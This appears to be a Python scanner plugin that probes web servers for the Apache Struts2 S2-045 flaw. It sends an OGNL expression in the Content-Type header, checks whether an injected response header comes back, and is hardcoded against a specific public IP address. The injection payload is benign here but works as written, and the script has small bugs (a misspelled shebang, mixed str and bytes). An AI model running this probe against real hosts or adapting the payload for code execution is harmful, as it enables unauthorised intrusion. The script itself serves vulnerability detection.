#!/usr/bin/evn python

import urllib.parse
import random
import socket


def assign(service, arg):
    if service == 'struts':
        return True, arg


def audit(arg):
    uri = urllib.parse.urlparse(arg).path
    http_host = urllib.parse.urlparse(arg).netloc
    host = None
    port = 80
    if ':' in http_host:
        host = http_host.split(':')[0]
        port = int(http_host.split(':')[1])
    else:
        host = http_host
    randint1 = random.randint(1000, 10000)
    raw = """POST {uri} HTTP/1.1
Host: {host}
Content-Length: 0
Content-Type: %{{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test-{randint1}','Kaboom')}}.('multipart/form-data')
Connection: Keep-Alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36

""".format(uri=uri, host=host, referer=arg, randint1=str(randint1)).replace('\n', '\r\n')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(20)
    s.connect((host, port))
    s.send(raw)
    data = s.recv(1024)
    if 'X-Test-%s' % (randint1) in data:
        security_hole("%s" % arg, uuid='%s_s2_045' % (host))

if __name__ == '__main__':
    from dummy import *
    audit(assign('struts', "http://112.126.88.39:7070/")[1])